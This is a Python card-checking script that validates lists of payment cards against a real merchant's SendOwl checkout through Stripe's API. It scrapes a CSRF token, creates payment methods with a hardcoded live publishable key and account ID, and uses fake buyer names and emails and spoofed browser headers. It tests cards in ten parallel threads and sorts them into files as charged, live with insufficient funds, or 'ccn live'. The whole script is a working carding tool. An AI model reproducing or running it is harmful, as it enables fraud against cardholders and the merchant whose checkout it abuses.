import requests
import random
import json
import concurrent.futures
import uuid
import time



def gen_user():
    list = "aqswderftgyhujikokplmjnhbgvfcdxzsadfaghajkalpqikeueygenrkdmzm918365101ndjjdbfjfinfjfnfjfnrirnkdndnrjekwpqowyeoeqplaoemfichgANMXMLXNCKZLAOISIEIDnxnxbksmwloqjdjakwoejdndkfo82838494903029"
    return random.choice(list)*1+random.choice(list)*2+random.choice(list)*1+random.choice(list)*3+random.choice(list)*1


def gen_name():
    characters = "aqswderftgyhujikokplmjnhbgvfcdxzsadfaghajkalpqikeueygenrkdmzmndjjdbfjfinfjfnfjfnrirnkdndnrjekwpqowyeoeqplaoemfichgANMXMLXNCKZLAOISIEIDnxnxbksmwloqjdjakwoejdndkfo"

    def random_chars(length):
        return ''.join(random.choice(characters) for _ in range(length))

    first_name = random_chars(4)
    last_name = random_chars(5)

    return f"{first_name} {last_name}"


def generate_extended_uuid():
    # 生成一个随机的 UUID
    standard_uuid = uuid.uuid4()

    # 生成额外的随机十六进制数字，附加到 UUID 后面
    extra_hex = ''.join(random.choices(
        '0123456789abcdef', k=4))  # 生成额外的4个十六进制字符

    # 将标准 UUID 与额外字符组合
    extended_uuid = f'{standard_uuid}{extra_hex}'
    return extended_uuid



def m_stripe():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "/"
    }

    response = requests.post("https://m.stripe.com/6", headers=headers)
    json_data = response.json()
    return json_data


# 生成csrf-token，订单
def gen_token_result():
    url = "https://transactions.sendowl.com/orders/129404345/8776b10a306dd250e89bcd1c35c83815/1"
    headers = {
        "Referer": "https://www.anspear.com/",
        "Sec-Ch-Ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Sec-Fetch-Dest": "iframe",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    }

    response = requests.get(url, headers=headers)
    while True:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            return response.text.split('name="csrf-token"')[1].split('"')[1]
        time.sleep(1)  # 间隔1秒后重试
    # print(response.text)
    # token = (response.text.split('name="csrf-token"')[1].split('"')[1])
    # print("token: " + token)
    # 7IHfbT/mTgsELmPaR3tQfebh7JM9CmQ0G4MJ71wrq199Owq+lgD5eA2dmeeh3REFgBVCnsJSj0JEa4PnP3BNow==
    # checkout = (response.text.split('Page.checkoutURL =')[1].split('"')[1])
    # print("check: " + checkout)
    # https://transactions.sendowl.com/orders/129404345/8776b10a306dd250e89bcd1c35c83815/1
    # order = (response.text.split('Page.ajaxUpdateURL     =')[1].split("'")[1].split('/orders/')[1].split('/2/')[0])
    # print("order: " + order)
    # 129404345/8776b10a306dd250e89bcd1c35c83815/1/update
    # url = (response.text.split('Page.ajaxUpdateURL     =')[1].split("'")[1])
    # print("url: " + url)
    # /orders/129404345/8776b10a306dd250e89bcd1c35c83815/1/update


# print(gen_token_result())



def create_pre_id():
    url = "https://transactions.sendowl.com/orders/129404345/8776b10a306dd250e89bcd1c35c83815/1/update"
    payload = {
        "preCardPaymentSave": "true",
        "callSync": "true",
        "order[buyer_email]": f"{gen_user()}@gmail.com",
        "gateway_selection": "on",
        "order[send_product_update_emails_consent]": "1",
        "order[apply_discount_code]": "",
        "order[gateway]": "Stripe",
        "order[payment_method]": "card",
        "authenticity_token": gen_token_result(),
        "utf8": "✓",
        "_method": "patch",
        "no_validation": "true"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Sec-Fetch-Dest": "iframe",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    response = requests.request("POST", url, data=payload, headers=headers)
    return response.json()

# create_pre_id()

def get_pm_id(card_line:str):
    pre_result = create_pre_id()
    # print(pre_result)
    c = card_line.strip()
    cc, exp, ex, cvc = c.split('|')

    # Adjust year based on month specifics
    exy = ex[2:4] if len(ex) > 2 else ex
    if '2' in exy[1] or '1' in exy[1]:
        exy = exy[0] + '7'

    url = "https://api.stripe.com/v1/payment_methods"

    payload = {
        "type": "card",
        "billing_details[address][country]": "US",
        "billing_details[name]": gen_name(),
        "billing_details[email]": gen_user() + "@gmail.com",
        "metadata[sendowl-hash]": f"/orders/129404345/8776b10a306dd250e89bcd1c35c83815/1",
        "card[number]": cc,
        "card[cvc]": cvc,
        "card[exp_month]": exp,
        "card[exp_year]": exy,
        "guid": generate_extended_uuid(),
        "muid": generate_extended_uuid(),
        "sid": generate_extended_uuid(),
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/db3292dc43; stripe-js-v3/db3292dc43; split-card-element",
        "referrer": "https://transactions.sendowl.com",
        "time_on_page": "820184",
        "key": "pk_live_hPiD0Nujsu7jC5a9PgZCXdPg",
        "_stripe_account": "acct_1DjRyEFxNB5y29mT"
    }
    # print(payload)
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
    }

    # print(response.text)
    while True:
        response = requests.post(url, data=payload, headers=headers)
        if "pm_" in response.text and response.status_code == 200:
            return response.json()['id']
        time.sleep(1)  # 间隔1秒后重试


# print(get_pm_id("5521154002430027|07|2029|873"))

def pay_check_card(pm_id:str):

    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
    }

    url = "https://transactions.sendowl.com/orders/129404345/8776b10a306dd250e89bcd1c35c83815/1/pre_charge_check"
    payload = {"payment_method_id": pm_id}
    headers['Content-Type'] = "application/json"

    response = requests.post(url, json=payload, headers=headers)
    while True:
        if response.status_code == 200:
            return response
        time.sleep(1)

def process_card(card):
    try:
        pm_id = get_pm_id(card.strip())
        # print(pm_id)
        result = pay_check_card(pm_id)
        print(result.text)
        card = card.strip()
        if 'success' in result.text:
            print(f'{card} | Charge ✅')
            with open('charge.txt', 'a') as file:
                file.write(f"{card}\n")
            with open('success.txt', 'a') as file:
                file.write(f"{result.text}\n")
        elif 'Your card has insufficient funds.' in result.text:
            print(f'{card} | insufficient funds ✅')
            with open('insufficient.txt', 'a') as file:
                file.write(f"{card}\n")
            with open('success.txt', 'a') as file:
                file.write(f"{result.text}\n")

        elif "Your card's security code is incorrect" in result.text:
            print(f'{card} | ccn live ✅')
            with open('ccn.txt', 'a') as file:
                file.write(f"{card}\n")
            with open('success.txt', 'a') as file:
                file.write(f"{result.text}\n")

        else:
            print(f'{card} | ' + result.json()['error']['message'])

    except Exception as e:
        print("An error occurred: ", str(e))


def check_cards_concurrent():
    file = "cards.txt"
    with open(file, 'r') as f:
        cards = f.readlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(process_card, cards))
        for result in results:
            print(result)


check_cards_concurrent()
